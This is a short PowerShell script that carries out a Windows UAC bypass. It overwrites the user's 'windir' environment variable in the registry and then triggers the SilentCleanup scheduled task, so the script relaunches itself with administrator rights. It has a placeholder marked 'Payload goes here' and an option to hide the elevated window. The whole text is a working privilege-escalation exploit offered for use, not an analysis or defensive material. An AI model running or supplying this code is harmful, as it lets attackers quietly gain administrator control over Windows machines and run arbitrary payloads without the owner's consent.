## Use powershell -ep byppass .\script.ps1 to launch
##
## Fixed an issue where if there are spaces in the script path.
##
## Added option for interactive window, comment out the code to change back to hidden
##
## Current example below opens and Admin powershell window
##
if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
    #Payload goes here
    #It'll run as Administrator
    powershell.exe
} else {
    $registryPath = "HKCU:\Environment"
    $Name = "windir"
    #Use for hidden window
    #$Value = "powershell -ExecutionPolicy bypass -windowstyle hidden -Command `"& `'$PSCommandPath`'`";#"
    #Use for interactive window
    $Value = "powershell -ExecutionPolicy bypass -Command `"& `'$PSCommandPath`'`";#"
    Set-ItemProperty -Path $registryPath -Name $name -Value $Value
    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
    Remove-ItemProperty -Path $registryPath -Name $name
}
